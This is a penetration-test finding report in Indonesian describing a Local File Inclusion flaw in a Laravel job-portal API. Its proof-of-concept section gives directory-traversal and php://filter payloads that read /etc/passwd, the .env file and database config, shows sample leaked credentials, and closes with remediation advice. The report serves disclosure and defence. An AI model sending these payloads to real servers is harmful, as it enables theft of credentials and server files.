# 📂 Finding 06: Local File Inclusion (LFI)

| Item | Detail |
|------|--------|
| **Kerentanan** | Local File Inclusion (LFI) — Manipulasi Parameter Path File |
| **Severity** | 🟠 High |
| **Skor CVSS** | 7.5 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`) |
| **Endpoint** | `GET /api/download?file=...` / `GET /page.php?file=...` |

---

## 📌 Deskripsi

Kerentanan ini terjadi karena aplikasi menerima jalur file (*file path*) dari input pengguna tanpa sanitasi atau validasi yang ketat di sisi server. Hal ini memungkinkan penyerang memanipulasi parameter lokasi file (misalnya menggunakan teknik *directory traversal* seperti `../`) untuk membaca file lokal yang ada di dalam server web.

---

## 💥 Dampak

- **Pencurian Data dan File Sensitif (Sensitive Data Exposure):** Penyerang dapat membaca file konfigurasi sistem, file sumber kode aplikasi, kredensial database, hingga file sensitif server (seperti `/etc/passwd` di Linux atau `c:\windows\win.ini` di Windows). laravel `(config/ app.php auth.php broadcasting.php cache.php cors.php database.php filesystems.php hashing.php logging.php mail.php queue.php services.php session.php view.php )`
- **Eskalasi Celah ke Remote Code Execution (RCE):** Jika penyerang berhasil mengakses file log server, file session, atau file unggahan lalu menyuntikkan kode berbahaya ke dalamnya (*log poisoning*), celah ini dapat berkembang menjadi eksekusi perintah sistem penuh.
- **Pengambilalihan Server (Full System Compromise):** Penyerang berpotensi mendapatkan akses kontrol penuh atas server aplikasi setelah berhasil menemukan informasi rahasia atau mengeksekusi kode di server.

---

## 🧪 Langkah Proof of Concept (PoC)

### 🔹 Langkah 1 — Identifikasi parameter lokasi file pada request HTTP

Menemukan endpoint aplikasi yang menerima masukan nama file/path melalui URL.

**Request:**

```http
GET /api/download?file=statement.pdf HTTP/1.1
Host: jobportal.vulnapp.id
```

> 📸 **[Capture Request Awal Parameter File]**

---

### 🔹 Langkah 2 — Memanipulasi parameter menggunakan teknik Directory Traversal (`../../../../etc/passwd`)

Mengganti nama file dengan sekuens traversal `../` untuk melompati direktori web root ke direktori sistem operasi.

**Request:**

```http
GET /api/download?file=../../../../etc/passwd HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response (Sensitif Content Leaked):**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

> 📸 **[Capture Response Berisi File /etc/passwd Server]**

---

### 🔹 Langkah 3 — Membaca file lingkungan dan konfigurasi sensitif Laravel (`.env` & `config/database.php`)

Menggunakan LFI dengan sekuens traversal `../../.env` untuk membaca file environment Laravel yang menyimpan rahasia aplikasi (*App Key* & *Database Credentials*), atau `config/database.php` via PHP filter wrapper.

**Request 1 — Accessing `.env` directly via LFI:**

```http
GET /api/download?file=../../.env HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response 1 (Environment Variables Leaked):**

```env
APP_NAME=JobPortal
APP_ENV=production
APP_KEY=base64:XyZ9Qk8rW... (APP_KEY)
APP_DEBUG=false

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=jobportal_db
DB_USERNAME=jobportal_user
DB_PASSWORD=S5cur3P@ssw0rd!
```

---

**Request 2 — Reading Laravel Config file (`config/database.php`) via PHP Filter:**

```http
GET /api/download?file=php://filter/read=convert.base64-encode/resource=../../config/database.php HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response 2 (Base64 Source Code):**

```text
PD9waHAKcmV0dXJuIFsgJ2RlZmF1bHQnID0+IGVudignREJfQ09OTkVDVElPTicsICdteXNxbCcpLCA...
```

> 📸 **[Capture Bocoran File .env & Config Laravel]**

---

## 🛠️ Rekomendasi Perbaikan

- **Gunakan Whitelist File yang Diizinkan:** Batasi input pengguna hanya pada daftar nama file yang sudah ditentukan secara pasti (*allowlist/whitelist*), daripada mengizinkan pemanggilan jalur file secara bebas.
- **Hindari Memasukkan File Berdasarkan Input Pengguna:** Gunakan pemeta (*mapping*) seperti angka ID atau kunci khusus untuk memanggil file internal, bukan menggunakan nama atau path file langsung dari URL atau input formulir.
- **Sanitasi Jalur File dan Gunakan Fungsi Penyaring:** Hapus karakter berbahaya seperti `../`, `..\`, atau karakter NUL byte dari input, dan gunakan fungsi bawaan bahasa pemrograman yang memverifikasi lokasi aman file (seperti `basename()` atau `realpath()`).
- **Terapkan Prinsip Least Privilege pada Server Web:** Batasi izin akses akun pengguna yang menjalankan layanan server web agar tidak memiliki akses membaca ke file sistem atau direktori di luar web root.